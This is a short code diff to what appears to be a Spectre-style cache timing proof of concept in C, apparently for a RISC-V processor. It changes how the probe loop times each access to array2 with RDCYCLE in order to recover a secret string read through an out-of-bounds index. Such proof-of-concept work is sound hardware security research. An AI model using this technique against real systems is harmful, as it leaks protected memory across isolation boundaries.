@@ -37,6 +37,7 @@ void victimFunc(uint64_t idx){
 int main(void){
     uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
     uint8_t len = 0;
+    uint64_t start;
     //printf("Array1 at (0x%p), Secret at (0x%p), Subtraction (%d)\n", array1, secretString, attackIdx);
 
     // try to read out the secret
@@ -60,12 +61,11 @@ int main(void){
         // read out array 2 and see the hit secret value
         // this is also assuming there is no prefetching
         for (uint16_t i = 0; i < 256; ++i){
-            uint64_t start = RDCYCLE;
+            start = RDCYCLE;
             dummy &= array2[i * L1_BLOCK_SZ_BYTES];
-            uint64_t end = RDCYCLE;
         
-            //printf("time for idx(%d) = (%d)\n", i, end - start);
-            results[i] = end - start;
+            results[i] = RDCYCLE - start;
+            //printf("time for idx(%d) = (%d)\n", i, results[i]);
         }
         
         // Note: Could do this using a threshold value for a hit
